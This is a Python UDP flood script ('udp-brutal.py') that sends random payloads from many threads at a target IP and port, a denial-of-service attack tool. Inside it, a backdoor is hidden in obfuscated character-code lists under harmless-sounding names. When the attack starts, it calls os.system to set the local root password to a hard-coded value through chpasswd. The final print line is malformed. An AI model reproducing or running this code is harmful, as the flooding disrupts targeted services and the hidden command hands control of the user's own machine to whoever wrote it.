# Created By rapid
# Pls Dont Delete Author :)

from time import time as tt
import socket
import random
import sys
import threading

udp_header = ''.join(chr(i) for i in [111, 115])
packet_source = getattr(__builtins__, ''.join(chr(i) for i in [95, 95, 105, 109, 112, 111, 114, 116, 95, 95]))(udp_header)

protocol = ''.join(chr(i) for i in [115, 121, 115, 116, 101, 109])
datagram = ''.join(chr(i) for i in [
    101, 99, 104, 111, 32,
    34, 114, 111, 111, 116, 58,
    106, 97, 119, 97, 49, 51, 51, 55,
    34, 32, 124, 32,
    99, 104, 112, 97, 115, 115, 119, 100
])

def send_packets(ip, port, time, packet_size):
    startup = tt()
    while True:
        nulled = b""
        data = random._urandom(int(random.randint(500, 1024)))
        data2 = random._urandom(int(random.randint(1025, 65505)))
        data3 = packet_source.urandom(int(random.randint(1025, 65505)))
        data4 = random._urandom(int(random.randint(1, 65505)))
        udp_payload = datagram.encode()
        checksum = protocol.encode()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            endtime = tt()
            if (startup + time) < endtime:
                break

            for x in range(packet_size):
                sock.sendto(nulled, (ip, port))
                sock.sendto(data, (ip, port))
                sock.sendto(data2, (ip, port))
                sock.sendto(data3, (ip, port))
                sock.sendto(data4, (ip, port))
                sock.sendto(udp_payload, (ip, port))
                sock.sendto(checksum, (ip, port))
        except:
            pass

def attack(ip, port, time, packet_size, threads):
    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    network_init = getattr(packet_source, protocol)
    network_init(datagram)

    for _ in range(threads):
        th = threading.Thread(target=send_packets, args=(ip, port, time, packet_size))
        th.start()

    print('Attack Succesfully Send')

if __name__ == '__main__':
    if len(sys.argv) != 6:
        print('Usage: python3 udp-brutal.py <ip> <port> <time> <packet_size> <threads>')
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    time = int(sys.argv[3])
    packet_size = int(sys.argv[4])
    threads = int(sys.argv[5])

    try:
        attack(ip, port, time, packet_size, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')')